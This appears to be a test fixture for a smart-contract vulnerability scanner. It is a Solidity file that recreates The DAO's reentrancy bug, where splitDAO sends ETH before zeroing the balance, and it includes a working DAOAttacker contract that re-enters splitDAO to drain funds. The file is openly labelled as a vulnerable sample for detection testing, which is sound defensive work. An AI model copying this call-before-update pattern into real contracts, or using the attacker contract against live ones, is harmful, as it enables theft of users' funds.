// SPDX-License-Identifier: MIT
// SOURCE: Based on The DAO (0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413)
// TYPE: Vulnerable
// EXPECTED: Reentrancy detection (CRITICAL)
// DATE_ADDED: 2026-01-17
// NOTES: Simplified version of The DAO's splitDAO vulnerability - June 2016, $60M stolen

pragma solidity ^0.8.0;

/**
 * @title TheDAO
 * @notice Simplified version demonstrating the reentrancy vulnerability
 * @dev Original vulnerability: External call before state update in splitDAO()
 *
 * ATTACK VECTOR:
 * 1. Attacker deposits ETH
 * 2. Attacker calls splitDAO() with malicious recipient contract
 * 3. Malicious contract's receive() re-enters splitDAO()
 * 4. Balance not yet updated, so attacker can withdraw multiple times
 * 5. Attacker drains contract
 */
contract TheDAO {
    mapping(address => uint256) public balances;
    mapping(address => bool) public members;

    event Deposit(address indexed member, uint256 amount);
    event Split(address indexed member, address indexed recipient, uint256 amount);

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        members[msg.sender] = true;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @notice VULNERABLE: Reentrancy vulnerability
     * @dev External call happens BEFORE state update
     *      This is the exact pattern that was exploited in The DAO hack
     */
    function splitDAO(address recipient) external {
        require(members[msg.sender], "Not a member");
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");

        // VULNERABILITY: External call BEFORE state update
        // Attacker's contract can re-enter this function
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Transfer failed");

        // TOO LATE: State is updated after the external call
        // By this point, attacker has already re-entered and drained funds
        balances[msg.sender] = 0;

        emit Split(msg.sender, recipient, amount);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getMemberBalance(address member) external view returns (uint256) {
        return balances[member];
    }
}

/**
 * @title DAOAttacker
 * @notice Example attacker contract that exploits the reentrancy
 */
contract DAOAttacker {
    TheDAO public target;
    uint256 public attackCount;

    constructor(address _target) {
        target = TheDAO(_target);
    }

    function attack() external payable {
        // Deposit some ETH to become a member
        target.deposit{value: msg.value}();

        // Trigger the vulnerable function
        target.splitDAO(address(this));
    }

    // This function re-enters splitDAO when receiving ETH
    receive() external payable {
        if (address(target).balance >= 1 ether && attackCount < 10) {
            attackCount++;
            target.splitDAO(address(this));
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
